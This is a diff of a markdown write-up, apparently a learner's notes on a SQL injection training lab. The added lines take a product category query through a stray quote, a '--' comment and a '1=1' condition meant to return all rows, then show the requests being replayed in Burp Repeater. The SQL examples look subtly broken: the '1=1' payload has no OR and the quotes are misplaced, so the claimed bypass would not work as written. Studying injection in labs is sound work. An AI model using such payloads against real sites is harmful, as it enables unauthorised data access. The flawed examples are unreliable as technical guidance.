@@ -49,5 +49,27 @@ We say also that Gifts is actually submitted as a GET request, something we have
 
 
 ```sql
-SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
+SELECT * FROM products WHERE category = ''Gifts' AND released = 1
 ```
+
+This should error, unless we comment out our string with --
+
+```sql
+SELECT * FROM products WHERE category = ''--Gifts' AND released = 1
+```
+
+If this last step doesn't return a server error, it could be possible to add a conditionally true statement, such as 1=1 to break the logic and return all the data:
+
+```sql
+SELECT * FROM products WHERE category = ''1=1--Gifts' AND released = 1
+```
+
+
+This can be done using burp repeater, first a normal request (akin to clicking on the gifts hyperlink)
+
+![image](https://user-images.githubusercontent.com/83407557/164751517-bb6967f3-20b5-41d6-a90e-366e767640df.png)
+
+And then with adding a single quote to our request
+
+![image](https://user-images.githubusercontent.com/83407557/164751825-6df5036f-d931-4c69-b4c4-65494878f2f1.png)
+
